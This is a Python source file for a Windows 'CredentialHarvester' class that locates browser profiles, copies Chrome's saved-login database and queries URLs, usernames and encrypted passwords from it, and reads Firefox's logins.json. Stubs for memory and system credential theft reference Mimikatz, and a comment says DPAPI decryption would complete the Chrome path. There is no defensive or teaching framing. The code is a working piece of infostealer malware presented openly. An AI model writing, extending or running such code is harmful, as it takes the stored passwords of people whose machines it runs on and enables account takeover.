import os
import sqlite3
import shutil
import tempfile
import json
import platform
from datetime import datetime

class CredentialHarvester:
    def __init__(self):
        self.system = platform.system().lower()
    
    def harvest(self, source):
        if self.system != 'windows':
            return {"status": "error", "error": "Only Windows is supported"}
        
        try:
            if source == "memory":
                return self._harvest_memory()
            elif source == "browsers":
                return self._harvest_browsers()
            elif source == "system":
                return self._harvest_system()
            else:
                return {"status": "error", "error": "Invalid source"}
        except Exception as e:
            return {"status": "error", "error": str(e)}
    
    def _harvest_memory(self):
        # This would use Mimikatz or similar in a real implementation
        return {"status": "success", "source": "memory", "data": []}
    
    def _harvest_browsers(self):
        results = {}
        appdata = os.getenv('APPDATA')
        local_appdata = os.getenv('LOCALAPPDATA')
        
        # Chrome
        chrome_path = os.path.join(local_appdata, 'Google', 'Chrome', 'User Data')
        if os.path.exists(chrome_path):
            results['chrome'] = self._extract_chrome_creds(chrome_path)
        
        # Firefox
        firefox_path = os.path.join(appdata, 'Mozilla', 'Firefox', 'Profiles')
        if os.path.exists(firefox_path):
            results['firefox'] = self._extract_firefox_creds(firefox_path)
        
        return {"status": "success", "source": "browsers", "data": results}
    
    def _extract_chrome_creds(self, chrome_path):
        try:
            login_data_path = os.path.join(chrome_path, 'Default', 'Login Data')
            temp_db = tempfile.NamedTemporaryFile(delete=False)
            shutil.copy2(login_data_path, temp_db.name)
            
            conn = sqlite3.connect(temp_db.name)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            
            results = []
            for url, user, encrypted_pass in cursor.fetchall():
                # In a real implementation, we'd decrypt the password using Windows DPAPI
                results.append({
                    "url": url,
                    "username": user,
                    "password": "[encrypted]"
                })
            
            conn.close()
            os.unlink(temp_db.name)
            return results
            
        except Exception as e:
            return {"error": str(e)}
    
    def _extract_firefox_creds(self, firefox_path):
        try:
            for profile in os.listdir(firefox_path):
                if profile.endswith('.default-release'):
                    db_path = os.path.join(firefox_path, profile, 'logins.json')
                    if os.path.exists(db_path):
                        with open(db_path, 'r', encoding='utf-8') as f:
                            data = json.load(f)
                            return data.get('logins', [])
            return []
        except Exception as e:
            return {"error": str(e)}
    
    def _harvest_system(self):
        # This would collect system credentials in a real implementation
        return {"status": "success", "source": "system", "data": []}